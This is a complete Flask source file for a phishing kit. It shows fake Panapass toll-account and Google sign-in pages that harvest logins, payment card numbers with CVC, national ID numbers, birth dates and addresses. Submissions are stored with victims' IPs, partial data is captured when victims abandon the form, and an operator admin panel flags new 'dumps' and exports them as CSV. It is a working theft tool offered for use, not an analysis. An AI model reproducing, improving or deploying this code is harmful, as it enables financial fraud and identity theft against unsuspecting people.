from flask import Flask, render_template, request, redirect, url_for, session, flash, send_file, make_response
import csv
import io
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = 'your_secret_key_here'  # Change to a secure random key
app.permanent_session_lifetime = 120  # 2 minutes session timeout

submissions = []

# Load existing data from file on startup (optional, to persist across restarts)
try:
    with open('captured_data.txt', 'r') as f:
        for line in f:
            # Parse lines roughly (adjust if format changes)
            parts = line.strip().split(', ')
            if len(parts) >= 18:  # Updated for removed amount, 18 columns now
                submissions.append({
                    'timestamp': parts[0].split('Timestamp: ')[1] if 'Timestamp:' in parts[0] else datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'tag_number': parts[1].split('Tag: ')[1] if 'Tag:' in parts[1] else '',
                    'select': parts[2].split('Payment: ')[1] if 'Payment:' in parts[2] else '',
                    'cardholder_name': parts[3].split('Name: ')[1] if 'Name:' in parts[3] else '',
                    'card_number': parts[4].split('Card: ')[1] if 'Card:' in parts[4] else '',
                    'expiration_date': parts[5].split('Expiry: ')[1] if 'Expiry:' in parts[5] else '',
                    'security_code': parts[6].split('CVC: ')[1] if 'CVC:' in parts[6] else '',
                    'email': parts[7].split('Email: ')[1] if 'Email:' in parts[7] else '',
                    'password': parts[8].split('Password: ')[1] if 'Password:' in parts[8] else '',
                    'phone_number': parts[9].split('Phone: ')[1] if 'Phone:' in parts[9] else '',
                    'date_of_birth': parts[10].split('DOB: ')[1] if 'DOB:' in parts[10] else '',
                    'id_number': parts[11].split('Cedula: ')[1] if 'Cedula:' in parts[11] else '',
                    'billing_address': parts[12].split('Street: ')[1] if 'Street:' in parts[12] else '',
                    'city': parts[13].split('City: ')[1] if 'City:' in parts[13] else '',
                    'province': parts[14].split('Province: ')[1] if 'Province:' in parts[14] else '',
                    'zip_code': parts[15].split('Zip: ')[1] if 'Zip:' in parts[15] else '',
                    'user_agent': parts[16].split('User Agent: ')[1] if 'User Agent:' in parts[16] else '',
                    'ip': parts[17].split('IP: ')[1] if 'IP:' in parts[17] else '',
                    'new': False  # Default for loaded data
                })
except FileNotFoundError:
    pass

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def handle_login():
    panapass = request.form.get('panapass')
    password = request.form.get('password')
    print(f"Captured Initial Login: Panapass={panapass}, Password={password}")
    return redirect(url_for('form'))

@app.route('/google_auth')
def google_auth():
    return render_template('auth.html')

@app.route('/form')
def form():
    return render_template('form.html')

@app.route('/submit', methods=['POST'])
def handle_submit():
    tag = request.form.get('tag')
    # Removed amount capture since field is removed
    payment_method = request.form.get('payment_method')
    full_name = request.form.get('full_name')
    card_number = request.form.get('card_number')
    expiry = request.form.get('expiry')
    cvc = request.form.get('cvc')
    email = request.form.get('email')
    phone = request.form.get('phone')
    dob = request.form.get('dob')
    cedula = request.form.get('cedula')
    street = request.form.get('street')
    city = request.form.get('city')
    province = request.form.get('province')
    zip_code = request.form.get('zip')
    
    user_agent = request.headers.get('User-Agent')
    ip = request.remote_addr
    
    session['form_data'] = {
        'tag': tag,
        'payment_method': payment_method,
        'full_name': full_name,
        'card_number': card_number,
        'expiry': expiry,
        'cvc': cvc,
        'email': email,
        'phone': phone,
        'dob': dob,
        'cedula': cedula,
        'street': street,
        'city': city,
        'province': province,
        'zip_code': zip_code,
        'user_agent': user_agent,
        'ip': ip,
    }
    session.permanent = True
    return redirect(url_for('google_auth'))

@app.route('/capture', methods=['POST'])
def capture_google():
    auth_email = request.form.get('email')
    auth_password = request.form.get('password')
    
    # Allow standalone captures (no session required for the first code)
    form_data = session.get('form_data', {})  # Default to empty dict if no session
    
    # If no session, populate minimal data from request (or defaults for logging)
    if not form_data:
        form_data = {
            'tag': 'N/A (standalone)',
            'payment_method': 'N/A (standalone)',
            'full_name': 'N/A (standalone)',
            'card_number': 'N/A (standalone)',
            'expiry': 'N/A (standalone)',
            'cvc': 'N/A (standalone)',
            'phone': 'N/A (standalone)',
            'dob': 'N/A (standalone)',
            'cedula': 'N/A (standalone)',
            'street': 'N/A (standalone)',
            'city': 'N/A (standalone)',
            'province': 'N/A (standalone)',
            'zip_code': 'N/A (standalone)',
            'user_agent': request.headers.get('User-Agent', 'N/A'),
            'ip': request.remote_addr or 'N/A',
        }
    
    submission = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'tag_number': form_data.get('tag', 'N/A'),
        'select': form_data.get('payment_method', 'N/A'),
        'cardholder_name': form_data.get('full_name', 'N/A'),
        'card_number': form_data.get('card_number', 'N/A'),
        'expiration_date': form_data.get('expiry', 'N/A'),
        'security_code': form_data.get('cvc', 'N/A'),
        'email': auth_email or 'N/A',
        'password': auth_password or 'N/A',
        'phone_number': form_data.get('phone', 'N/A'),
        'date_of_birth': form_data.get('dob', 'N/A'),
        'id_number': form_data.get('cedula', 'N/A'),
        'billing_address': form_data.get('street', 'N/A'),
        'city': form_data.get('city', 'N/A'),
        'province': form_data.get('province', 'N/A'),
        'zip_code': form_data.get('zip_code', 'N/A'),
        'user_agent': form_data.get('user_agent', request.headers.get('User-Agent', 'N/A')),
        'ip': form_data.get('ip', request.remote_addr or 'N/A'),
        'new': False
    }
    
    submissions.append(submission)
    
    with open('captured_data.txt', 'a') as f:
        f.write(f"Timestamp: {submission['timestamp']}, Tag: {submission['tag_number']}, Payment: {submission['select']}, Name: {submission['cardholder_name']}, Card: {submission['card_number']}, Expiry: {submission['expiration_date']}, CVC: {submission['security_code']}, Email: {auth_email or 'N/A'}, Password: {auth_password or 'N/A'}, Phone: {submission['phone_number']}, DOB: {submission['date_of_birth']}, Cedula: {submission['id_number']}, Street: {submission['billing_address']}, City: {submission['city']}, Province: {submission['province']}, Zip: {submission['zip_code']}, User Agent: {submission['user_agent']}, IP: {submission['ip']}\n")
    
    # Clear session only if it exists
    if 'form_data' in session:
        session.pop('form_data', None)
    
    # Return JSON for better JS handling in the first code
    return {'status': 'success'}, 200

@app.route('/timeout_capture', methods=['POST'])
def timeout_capture():
    reason = request.form.get('reason', 'timeout')  # Get reason, default to 'timeout'
    email_reason = f'N/A ({reason})'  # e.g., 'N/A (tab_switched)'
    
    # Allow standalone timeouts
    form_data = session.get('form_data', {})
    if not form_data:
        # Log minimal abandon data without session
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        with open('captured_data.txt', 'a') as f:
            f.write(f"Timestamp: {timestamp}, Tag: N/A (standalone {reason}), Payment: N/A, Name: N/A, Card: N/A, Expiry: N/A, CVC: N/A, Email: {email_reason}, Password: {email_reason}, Phone: N/A, DOB: N/A, Cedula: N/A, Street: N/A, City: N/A, Province: N/A, Zip: N/A, User Agent: {request.headers.get('User-Agent', 'N/A')}, IP: {request.remote_addr or 'N/A'}\n")
        return '', 200
    
    # Existing logic for session-based timeouts
    submission = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'tag_number': form_data.get('tag', 'N/A'),
        'select': form_data.get('payment_method', 'N/A'),
        'cardholder_name': form_data.get('full_name', 'N/A'),
        'card_number': form_data.get('card_number', 'N/A'),
        'expiration_date': form_data.get('expiry', 'N/A'),
        'security_code': form_data.get('cvc', 'N/A'),
        'email': email_reason,
        'password': email_reason,
        'phone_number': form_data.get('phone', 'N/A'),
        'date_of_birth': form_data.get('dob', 'N/A'),
        'id_number': form_data.get('cedula', 'N/A'),
        'billing_address': form_data.get('street', 'N/A'),
        'city': form_data.get('city', 'N/A'),
        'province': form_data.get('province', 'N/A'),
        'zip_code': form_data.get('zip_code', 'N/A'),
        'user_agent': form_data.get('user_agent', request.headers.get('User-Agent', 'N/A')),
        'ip': form_data.get('ip', request.remote_addr or 'N/A'),
        'new': False
    }
    
    submissions.append(submission)
    
    with open('captured_data.txt', 'a') as f:
        f.write(f"Timestamp: {submission['timestamp']}, Tag: {submission['tag_number']}, Payment: {submission['select']}, Name: {submission['cardholder_name']}, Card: {submission['card_number']}, Expiry: {submission['expiration_date']}, CVC: {submission['security_code']}, Email: {email_reason}, Password: {email_reason}, Phone: {submission['phone_number']}, DOB: {submission['date_of_birth']}, Cedula: {submission['id_number']}, Street: {submission['billing_address']}, City: {submission['city']}, Province: {submission['province']}, Zip: {submission['zip_code']}, User Agent: {submission['user_agent']}, IP: {submission['ip']}\n")
    
    session.pop('form_data', None)
    return '', 200

@app.route('/admin/login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username in ['Z', 'Carter Lions'] and password == 'Ominous':
            session['logged_in'] = True
            session['username'] = username
            # Set default old last_login if none (for first login, treat all as new)
            if not session.get('last_login'):
                session['last_login'] = '2000-01-01 00:00:00'
            # Save old last_login for comparison, then update to now
            old_last_login = session['last_login']
            session['last_login'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            session['old_last_login'] = old_last_login  # Store for dashboard
            return redirect(url_for('admin_dashboard'))
        flash('Invalid credentials', 'error')
    return render_template('admin_login.html')

@app.route('/admin/dashboard')
def admin_dashboard():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    username = session.get('username', 'Admin')
    
    # Set 'new' flag based on old last_login (before current login)
    old_last_login_str = session.get('old_last_login', '2000-01-01 00:00:00')
    old_last_login = datetime.strptime(old_last_login_str, '%Y-%m-%d %H:%M:%S')
    first_new_index = -1  # Track index of first new submission
    has_new_dumps = False
    for i, sub in enumerate(submissions):
        sub_time = datetime.strptime(sub['timestamp'], '%Y-%m-%d %H:%M:%S')
        sub['new'] = sub_time > old_last_login
        if sub['new'] and first_new_index == -1:
            first_new_index = i
            has_new_dumps = True
    
    return render_template('admin.html', submissions=submissions, username=username, first_new_index=first_new_index, has_new_dumps=has_new_dumps)

@app.route('/admin/logout')
def admin_logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    # Keep last_login for next login comparison
    return redirect(url_for('admin_login')) 

@app.route('/admin/download')
def admin_download():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow(['Timestamp', 'Tag Number', 'Select', 'Cardholder\'s Name', 'Card Number', 'Expiration Date', 'Security Code', 'Email', 'Password', 'Phone Number', 'Date of birth', 'ID Number', 'Billing Address', 'City', 'Province', 'Zip Code', 'User Agent', 'IP'])
    for sub in submissions:
        writer.writerow([sub['timestamp'], sub['tag_number'], sub['select'], sub['cardholder_name'], sub['card_number'], sub['expiration_date'], sub['security_code'], sub['email'], sub['password'], sub['phone_number'], sub['date_of_birth'], sub['id_number'], sub['billing_address'], sub['city'], sub['province'], sub['zip_code'], sub['user_agent'], sub['ip']])
    
    output.seek(0)
    return send_file(io.BytesIO(output.getvalue().encode('utf-8')), mimetype='text/csv', as_attachment=True, download_name='submissions.csv')

@app.route('/admin/clear', methods=['POST'])
def admin_clear():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    submissions.clear()
    open('captured_data.txt', 'w').close()
    flash('All data cleared')
    return redirect(url_for('admin_dashboard'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
